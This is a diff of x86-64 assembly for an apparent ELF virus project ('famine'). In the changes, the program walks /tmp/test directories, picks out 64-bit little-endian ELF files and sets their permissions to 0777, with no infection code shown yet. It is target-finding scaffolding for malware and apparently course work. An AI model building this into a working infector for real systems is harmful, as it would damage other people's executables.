@@ -5,6 +5,7 @@ default rel
 section .text
     ; Trazas
     hello db            "[+] Hello",10,0  ;11
+    dir db              "[+] dir",10,0  ;9
 
     global _start
     dirs db         "/tmp/test",0,"/tmp/test2",0,0
@@ -31,7 +32,7 @@ section .text
         mov VAR(famine.fd_dir), rax
 
         .dirent:
-            mov rax, SC_GETDENTS
+            mov rax, SC_GETDENTS64
             mov rdi, VAR(famine.fd_dir)
             lea rsi, VAR(famine.dirent_struc)
             mov rdx, 1024
@@ -44,12 +45,14 @@ section .text
         ; r12 = offset to dirent_struc node
         ; rax = total bytes read in getdents
         .validate_files_types:
+            cmp r12, rax
+            jge .dirent
             lea rdi, VAR(famine.dirent_struc)
             add rdi, r12
-            movzx edx, word [rdi + dirent.d_len]
-            add r12, rdx
-            cmp byte [rdi + rdx - 1], REGULAR_FILE
-            jne .next_file
+            movzx ecx, word [rdi + dirent.d_len]
+            add r12, rcx
+            cmp byte [rdi + dirent.d_type], DT_REG
+            jne .validate_files_types
             add rdi, dirent.d_name
 
             .openat:
@@ -60,7 +63,7 @@ section .text
                 mov rax, SC_OPENAT
                 syscall
                 test rax, rax
-                jle .end_openat
+                jle .skip_file
                 mov VAR(famine.fd_file), rax
                 
             .fstat:
@@ -70,7 +73,7 @@ section .text
                 mov rax, SC_FSTAT
                 syscall
                 test rax, rax
-                jl .restore_stack
+                jl .end_fstat
                 
                 ; file type
                 mov eax, dword [rsp + 24]   ; st-mode fstat struct 
@@ -80,26 +83,50 @@ section .text
                 mov eax, dword [rsp + 24]   ; st-mode again
                 and eax, 0o777
                 mov dword VAR(famine.file_permissions), eax
+                jmp .magic_numbers
                 
-                .restore_stack:
-                    add rsp, 144 
-                    jmp .close_file
+                .end_fstat:
+                    add rsp, 144
+                    jmp .close_file 
+
+            .magic_numbers:
+                mov rdi, VAR(famine.fd_file)
+                lea rsi, VAR(famine.elf_ehdr)
+                mov rdx, 64   
+                mov rax, SC_READ
+                syscall
+                ; Magic numbers
+                cmp dword VAR(famine.elf_ehdr), MAGIC_NUMBERS
+                jne .close_file
+                ; 64 bits
+                cmp byte VAR(famine.elf_ehdr + 4), 2     ;EI_CLASS
+                jne .close_file
+                ; Little endian
+                cmp byte VAR(famine.elf_ehdr + 5), 1     ;EI_CLASS
+                jne .close_file
+
+            .fchmod:
+                mov rdi, VAR(famine.fd_file)
+                mov rsi, 0o777
+                mov rax, SC_FCHMOD
+                syscall
             
-            .close_file:
+                .close_file:
                 mov rdi, VAR(famine.fd_file)
                 mov rax, SC_CLOSE
                 syscall
 
-            .chmod:
+            ;.end_openat:
+            ;    pop rax
+                ; jmp .next_file
 
-
-            .end_openat:
-                pop rax
-                jmp .next_file
-
-        .next_file:
-            cmp r12, rax
-            jb .validate_files_types
+        ; .next_file:
+        ;     cmp r12, rax
+        ;     jge .validate_files_types
+        
+        .skip_file:
+            pop rax
+            jmp .validate_files_types
 
         .close_dir:
             mov rax, SC_CLOSE
@@ -119,7 +146,6 @@ section .text
             jnz .open_dir
 
         .exit:
-            TRACE_TEXT hello, 11
             mov rax, SC_EXIT
             syscall
     
